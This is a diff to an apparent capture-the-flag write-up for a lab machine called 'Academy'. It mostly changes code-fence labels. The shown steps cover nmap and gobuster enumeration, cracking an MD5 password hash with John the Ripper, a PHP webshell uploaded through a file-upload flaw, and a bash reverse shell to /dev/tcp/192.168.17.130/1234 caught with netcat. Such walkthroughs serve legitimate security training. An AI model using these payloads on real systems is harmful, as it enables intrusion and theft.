@@ -1,7 +1,7 @@
 ### Enumeration
 
-```
-~$ nmap -sV 192.168.17.135 //IP of academy machine
+```bash
+~$ nmap -sV 192.168.17.135
 ```
 ![Image-1](https://github.com/AmnesiacDev/Amnesiac-Writeups/blob/main/HackTheBox/Academy/Attachments/Pasted%20image%2020260722174445.png)
 
@@ -14,7 +14,7 @@ Indeed we login as anonymous and find "note.txt" file which contains the followi
 
 We find credentials for StudentRegNo and a hashed password, to dehash the password we store it in hash.md file and crack it using johntheripper with md5 format
 
-```
+```bash
 ~$ john --format=raw-md5 hash.md
 cd73502828457d15655bbd7a63fb0bc8:student
 ```
@@ -23,7 +23,7 @@ Lets check the apache webserver
 
 ![image-4](https://github.com/AmnesiacDev/Amnesiac-Writeups/blob/main/HackTheBox/Academy/Attachments/Pasted%20image%2020260722175713.png)
 
-```
+```bash
 ~$ gobuster dir -u http://192.168.17.135 -w /usr/share/wordlists/dirb/big.txt
 ===============================================================
 [+] Url:                     http://192.168.17.135
@@ -57,7 +57,7 @@ A very interesting result could be found at /academy/my-profile.php, can you spo
 
 The ability to upload an image could be vulnerable to a File upload exploit
 
-```
+```bash
 ~$ echo "<?php system('cat /etc/passwd');?>" > not_a_payload.php
 ```
 
@@ -67,7 +67,7 @@ now lets upload our not-suspicious payload and see if it works
 
 Perfect, now lets create a reverse shell
 
-```
+```bash
 ~$ echo "<?php system('/bin/bash -c "bash -i >& /dev/tcp/192.168.17.130/1234 0>&1"');?>" > not_a_payload.php
 ~$ nc -lvnp 1234
 connect to [192.168.17.130] from (UNKNOWN) [192.168.17.135] 51880
@@ -89,7 +89,7 @@ Our first escalation to a higher priv user, now we need to escalate to a root us
 
 Only interesting thing we found was in /etc/crontab
 
-```
+```bash
 ~$ cat /etc/crontab
 SHELL=/bin/sh
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
